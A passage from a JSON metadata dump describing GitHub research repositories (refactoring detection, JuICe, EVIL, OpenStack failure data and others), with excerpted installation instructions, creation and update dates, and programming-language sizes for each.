                    "value": "To detect refactorings in your repository, you must first install this [Chrome plug-in](https://chrome.google.com/webstore/detail/refactoring-aware-review/bclbegekihgpelanbbleaceefgmekjdd) and configure RefDiff on [Github Actions](https://help.github.com/en/actions/configuring-and-managing-workflows/configuring-a-workflow).\n\n<a href=\"https://chrome.google.com/webstore/detail/refactoring-aware-diff/bclbegekihgpelanbbleaceefgmekjdd\">\n    <img width=\"200px\" src=\"https://user-images.githubusercontent.com/7620947/75341916-26e1bc00-5874-11ea-9526-463ddf1e7f82.png\" />\n</a>\n\nTo execute RefDiff as Github Actions, you need to create a workflow file in `.github/workflows` folder with `.yaml` extension. Example of configuration: `.github/workflows/workflow.yml`:\n\n```yaml\non: [pull_request] # Trigger RefDiff after each pull request\n\njobs:\n    main:\n        runs-on: ubuntu-latest\n        name: Refactoring Detection\n        steps:\n            - name: Git Checkout\n              uses: actions/checkout@v2\n              with:\n                  fetch-depth: 0\n\n            - name: raid\n              env:\n                  LANGUAGE: ${{ github.event.repository.language }} # Supports Java, Javascrit, C and Go.\n                  REV_BEFORE: ${{ github.event.pull_request.base.sha }}\n                  REV_AFTER: ${{ github.event.pull_request.head.sha }}\n              uses: rodrigo-brito/refactoring-aware-diff@action\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "RAID: Refactoring-aware and Intelligent Diffs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rodrigo-brito/refactoring-aware-diff/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n    <img src=\"https://user-images.githubusercontent.com/7620947/76000414-706c7f80-5ee2-11ea-8f21-06bfb2646b36.png\" width= \"400px\" />\n</p> \n",
                    "original_header": "RAID: Refactoring-aware and Intelligent Diffs"
                },
                "confidence": 0.9728282780648082,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rodrigo-brito/refactoring-aware-diff/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-07T13:31:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-12T04:19:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1279881
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 6432
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 4344
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 66
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "767": {
        "filename": "rajasagashe_juice_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rajasagashe/JuICe",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "    conda create -n {name} python=3.6\n    conda activate {name}\n    \n    pip install -r requirements.txt\n    \n    # decompress the downloaded notebooks file\n    unzip juice_notebooks.zip\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "JuICe Dataset"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rajasagashe/juice/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Code for the [paper](https://arxiv.org/abs/1910.02216). This repository produces the dataset from the collected Jupyter notebooks. The dataset is available [here](https://drive.google.com/file/d/1xWDV__5hjTWVuJlXD42Ar7nkjU2hRTic/view?usp=sharing) if you don't want to run this pipeline. Modeling code is [here](https://github.com/rajasagashe/JuICe-models).\n \n",
                    "original_header": "JuICe Dataset"
                },
                "confidence": 0.9998548501214548,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rajasagashe/juice/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-17T02:49:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-14T07:36:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 104505
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1595
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "768": {
        "filename": "dessertlab_EVIL_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dessertlab/EVIL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Experiments Replication\nThis section is written based on our setup experience on *Red Hat's Linux 7.5* and *CentOS Linux release 7.5.1804*. Please run on a Linux OS. It is strongly recommended to run with **at least one GPU**.\n\nBefore setting up our project we'd like to make sure you have some prerequisite installations and setups.\n\n\n\n## Step 1: Python Setup\nEnsure you have Anaconda3 installed, if not install **Python 3.7** from [*Anaconda*](https://www.anaconda.com) with the following steps:\n* Install the list of dependencies described [here](https://docs.anaconda.com/anaconda/install/linux/)\n* Download the installer [here](https://repo.anaconda.com/archive/). For example, you can use the `wget` command: `wget https://repo.anaconda.com/archive/Anaconda3-2021.05-Linux-x86_64.sh`, then type `chmod +x Anaconda3-2021.05-Linux-x86_64.sh` and run `bash Anaconda3-2021.05-Linux-x86_64.sh` to complete the installation.\n* You may need to add *anaconda directory* to the PATH environment variable (e.g., you can add `export PATH=\"/path_to_anaconda/anaconda3/bin:$PATH\"` to the `bashrc` file).\n\n### Recommended GPU Set up\n* If you are using an HPC cluster run the following command to enable **Python 3.7 with CUDA**: `module load cuda/9.2  anaconda3/5.0.1-cuda92`\n* If you are using a local machine and have anaconda set up already run the following command `conda env create -f evil_env_gpu.yml` Upon completion activate it using `conda activate evil_env`. Alternatively to using our environment file, you can run ``conda install pytorch torchvision cudatoolkit=11.1 -c pytorch -c nvidia`` followed by ``pip3 install -r requirements_gpu.txt --user``. After this, you can move to the Install Natural Language tools section. \n\n\n## Step 2: Dependencies Setup\n* Move to the EVIL main directory\n* It is recommended you use a virtual environment for the dependency set up (**Conda environment**). If you do not wish to do so, then simply run ``pip3 install -r requirements.txt --user``.\n\n### Setting up a Conda environment\n* Import our saved conda environment using the command: ``conda env create -f evil_env.yml`` and activate it using ``source activate evil_env`` or ``conda activate evil_env``\n\n* Alternatively, you can create an anaconda Python 3.7 virtual environment using the command ``conda create -n yourenvname python=3.7 anaconda``.  Activate the environment by typing ``source activate yourenvname``.\n\n* Run ``pip3 install -r requirements.txt --user`` to install the dependencies.\n\n### Install Natural Language tools\n* Install nltk tokenizers and corpora ``python -m nltk.downloader``, then type `d` (Download), and type `all` in Identifier. Type `q` at the end of the installation.\n\n* Install the spacy language model by using the following command ``python -m spacy download en_core_web_lg``\n   \n\n## Step 3: Running Experiments\nThis section briefly describes how to replicate the experiment mentioned in the paper. If you are using an anaconda environment, please ensure that your conda environment is **activated** before running any of the bash commands below.\n\n### CodeBERT\nTo Launch the finetuning and evaluation processes of CodeBERT the basic command template is as follows: <br>\n``bash CodeBERT_Launch.sh [DEVICE] [DATASET] [PREPROCESSING]``<br>\n\n**Device Options**:\n\n0. Local machine\n1. HPC with a SLURM scheduler\n2. HPC with a TORQUE scheduler\n\n**Dataset Options:** \n1.  Python Encoder Dataset\n2.  Assembly Decoder Dataset\n\n**Preprocessing Options:**\n\n0. Raw corpus counts\n1. Preprocessing without the Intent Parser (IP)\n2. Preprocessing with the Intent Parser (IP)\n\n#### Running on a local machine\n* From the EVIL home directory, run ``bash CodeBERT_Launch.sh 0 [DATASET] [PREPROCESSING]``\n\n#### Running on an HPC with a SLURM scheduler\n* Navigate to ``EVIL/model/fine_tune.slurm`` and add in your GPU queue name under the TODO comment.\n* From the EVIL home directory, run ``bash CodeBERT_Launch.sh 1 [DATASET] [PREPROCESSING]``\n* When the job is complete, from the EVIL home directory, run ``bash evaluate.sh``\n* Note: If your cluster jobs do not connect to the internet you might want to run the bash script on the head node using the local machine option ``bash CodeBERT_Launch.sh 0 [DATASET] [PREPROCESSING]`` to download the models and terminate it before it gets to the training portion (you'll see a progress bar when right before the training starts).\n\n#### Running on an HPC with a TORQUE scheduler\n* Navigate to ``EVIL/model/fine_tune.pbs`` and add in your GPU queue name under the TODO comment.\n* From the EVIL home directory, run ``bash CodeBERT_Launch.sh 2 [DATASET] [PREPROCESSING]``\n* When the job is complete, from the EVIL home directory, run ``bash evaluate.sh``\n* Note: If your cluster jobs do not connect to the internet you might want to run the bash script on the head node using the local machine option ``bash CodeBERT_Launch.sh 0 [DATASET] [PREPROCESSING]`` to download the models and terminate it before it gets to the training portion (you'll see a progress bar when right before the training starts).\n\n#### Final Results\nThe final evaluation results would appear on your console if you are running on your local machine and in the specified logging output directory if a job was submitted.\nThe predicted output will be generated in the subdirectory ``model/eval/[encoder/decoder]_test_output.json``.\n\n\n### Seq2Seq \nTo launch the training and evaluation of the Seq2Seq model mentioned in the paper also ensure the conda environment is active. The basic command template is as follows: <br>\n``bash Seq2Seq_Launch.sh [DATASET] [PREPROCESSING]``<br>\nThe dataset and preprocessing options are the same as that of CodeBERT.\n\n#### Final Results\nThe final evaluation results would appear on your console if you are running on your local machine and in the specified logging output directory `seq2seq/logs`\nThe predicted output will be generated in the subdirectory ``seq2seq/archive/id-[timestamp]/answer_[encoder/decoder].txt``.\n\n\n \n## Notes\n* Run ``bash utils/test_split.sh`` for details on the different preprocessing options\n* If you chose to submit a job, the logs will be stored in ``model/job_logs/``, named with the job id.\n* Run ``bash utils/test_split.sh [DATASET] 0`` for raw corpus token counts\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/dessertlab/EVIL/main/INSTALL.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-08-06T17:25:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-11T05:15:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 856576
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 17615
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 2982
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cython",
                    "name": "Cython",
                    "type": "Programming_language",
                    "size": 467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "769": {
        "filename": "dessertlab_Failure-Dataset-OpenStack_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dessertlab/Failure-Dataset-OpenStack",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-02-04T09:43:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T11:15:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "770": {
        "filename": "Ali-Stanford_ChatGPT_Programming_Numerical_Methods_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Ali-Stanford/ChatGPT_Programming_Numerical_Methods",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Authors:** Ali Kashefi (kashefi@stanford.edu) & Tapan Mukerji (mukerji@stanford.edu)<br>\n**Version:** 2.0 <br> \n**Questions?** <br>\nIf you have any questions or need assistance, please do not hesitate to contact Ali Kashefi (kashefi@stanford.edu) via email. \n",
                    "original_header": "ChatGPT for Programming Numerical Methods"
                },
                "confidence": 0.9314647478081928,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Ali-Stanford/ChatGPT_Programming_Numerical_Methods/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-24T01:13:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-21T16:38:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 24000
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 17234
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 5985
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1706
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Julia",
                    "name": "Julia",
                    "type": "Programming_language",
                    "size": 988
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "771": {
        "filename": "FoRTE-Research_HeXcite_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FoRTE-Research/HeXcite",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "#\n<p align=center> <a href=\"https://www.cs.vt.edu\"><img border=\"0\" src=\"http://people.cs.vt.edu/snagy2/img/vt_inline_computer_science.png\" width=\"60%\" height=\"60%\">\n</a> </p>\n \n"
                },
                "confidence": 0.9973293212762484,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/HeXcite/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-07T19:57:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T09:12:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 349502
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 28779
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 13554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 5623
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3476
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "772": {
        "filename": "huangkNIPC_APR-Survey_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/KaiHuangNIPC/APR-Survey",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-02-18T08:25:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-25T06:19:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 59888
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1415
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "773": {
        "filename": "Yuanyuan-Yuan_Decision-Oracle_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Yuanyuan-Yuan/Decision-Oracle",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Extended version: https://arxiv.org/pdf/2210.04942.pdf \n",
                    "original_header": "Decision-Oracle"
                },
                "confidence": 0.9861817130287298,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Yuanyuan-Yuan/Decision-Oracle/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-30T09:21:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-12T14:15:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "774": {
        "filename": "efactoring-ai_predicting-refactoring-ml_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/refactoring-ai/predicting-refactoring-ml",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can run the data collection by simply running the `RunSingleProject.java` class. This class contains a program that requires the following parameters, in this order:\n\n1. _The dataset name_: A hard-coded string with the name of the dataset (e.g., \"apache\", \"fdroid\"). This information appears in the generated data later on, so that you can use it as a filter.\n\n1. _The git URL_: The git url of the project to be analyzed. Your local machine must have all the permissions to clone it (i.e., _git clone url_ should work). Cloning will happen in a temporary directory.\n\n1. _Storage path_: The directory where the tool is going to store the source code before and after the refactoring. This step is important if you plan to do later analysis on the refactored files. The directory structure basically contains the hash of the refactoring, as well as the file before and after. The name of the file also contains the refactoring it suffered, to facilitate parsing. For more details on the name of the file, see our implementation.\n\n1. _Database URL_: JDBC URL that points to your MySQL. The database must exist and be empty. The tool will create the required tables.\n\n1. _Database user_: Database user.\n\n1. _Database password_: Database password. \n\n1. _Store full source code?_: True if you want to store the source code before and after in the storage path.\n\nThese parameters can be passed via command-line, if you exported a JAR file. \nExample:\n\n```\njava -jar refactoring.jar <dataset> <git-url> <output-path> <database-url> <database-user> <database-password> <k-threshold>\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Running in a manual way",
                    "parent_header": [
                        "Machine Learning for Software refactoring",
                        "The data collection tool"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/refactoring-ai/predicting-refactoring-ml/master/README.md"
            },
            {
                "result": {
                    "value": "First, install all the dependencies:\n\n```\npip3 install --user -r requirements.txt\n```\n\nThen, create a `config.ini` file, following the example structure in\n`config-example.ini`. In this file, you configure your database connection.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing and configuring the database.",
                    "parent_header": [
                        "Machine Learning for Software refactoring",
                        "The machine learning pipeline"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/refactoring-ai/predicting-refactoring-ml/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Use Maven: `mvn clean compile`. Or just import it via IntelliJ; it will know what to do. \nIf you want to export a jar file and run it somewhere else, just do `mvn clean package`. A .jar file will be created under the `target/` folder. You can use this jar to run the tool manually. \n",
                    "original_header": "Compiling the tool"
                },
                "confidence": 0.9915390615309756,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/refactoring-ai/predicting-refactoring-ml/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For this script to run, you need to create a `results/` folder inside the\n`machine-learning` folder. The results will be stored there. \nIf you need to clean up the cache, simply delete the `_cache` directory that is created under the `machine-learning` folder. \n",
                    "original_header": "Training and testing models"
                },
                "confidence": 0.9440151941554866,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/refactoring-ai/predicting-refactoring-ml/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-04-10T12:25:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-20T04:12:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 264349
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 80716
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8919
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 122
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "775": {
        "filename": "RI-SE_smirk_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RI-SE/smirk",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "External pull requests are welcome, but must be reviewed before they can be merged into the master branch. Reviewers may ask questions or make suggestions for edits and improvements before your feature can be merged. If your feature branch pull request is not accepted, make the necessary adjustments or fixes as indicated by the repository administrators and redo the pull request. \n",
                    "original_header": "Branching Model"
                },
                "confidence": 0.9997409331915685,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/RI-SE/smirk/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Create a Python 3.7 virtual environment with your preferred tool e.g. using conda:\n```\n$ conda create -n=smirk-env python=3.7\n$ conda activate smirk-env\n```\nInstallation in interactive mode currently requires [poetry](https://python-poetry.org/). Once poetry is installed SMRIK can be installed as follows:\n```\n$ git clone https://github.com/RI-SE/smirk && cd smirk\n$ poetry install\n```\n \nFurther instructions on reproducing the results and running custom experiments will be provided in the [docs](/docs/README.md).\n \n",
                    "original_header": "Quickstart"
                },
                "confidence": 0.9569795934574298,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/RI-SE/smirk/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-03T11:53:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-20T01:02:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 594045
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 22859
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 4655
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2999
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "776": {
        "filename": "szmousavi_SLR-of-Security-API-Misuse-Detection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/szmousavi/SLR-of-Security-API-Misuse-Detection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-05-24T05:03:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-07T02:00:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "777": {
        "filename": "ai-se_Jitterbug_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ai-se/Jitterbug",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\nJitterbug$ pip install -r requirements.txt\nJitterbug$ python\n>>> import nltk\n>>> nltk.download('punkt')\n>>> nltk.download('wordnet')\nJitterbug$ cd src\n```",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "<a href=\"https://arxiv.org/abs/2002.11049\">Identifying Self-Admitted Technical Debts with Jitterbug: A Two-step Approach</a>",
                        "Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ai-se/Jitterbug/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-11-06T15:13:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-16T03:18:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 44049
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "778": {
        "filename": "mdrafiqulrabin_Code2Snapshot_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mdrafiqulrabin/Code2Snapshot",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-24T20:15:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-30T15:07:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 51150
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 4182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3262
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "779": {
        "filename": "khaes-kth_GithubRepairPatterns_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/khaes-kth/GithubRepairPatterns",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The manual experiment for determining the bug-fix detected commits. \n1.\tClone this repository.\n2.\tOpen the [\"results/detected_checked_on_all.csv\" file](https://github.com/khaes-kth/GithubRepairPatterns/blob/master/results/detected_checked_on_all.csv). Open the commit links assigned to you.\n\t1.\tIf it is a bug-fix commit, put \"bug-fix\" at the end of the line.\n\t2.\tIf it is not a bug-fix commit, put \"non-bug-fix\" at the end of the line.\n\t3.\tIf you are very confused and cannot decide about it, put \"dont-know\" at the end of the line.\n3.\tSave the file and create a pull request with the updated version. \n",
                    "original_header": "Determining Bug-fix Commits"
                },
                "confidence": 0.9592216452666518,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/khaes-kth/GithubRepairPatterns/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-09-25T15:02:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-02-21T11:28:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 481389
                },
                "confidence": 1,
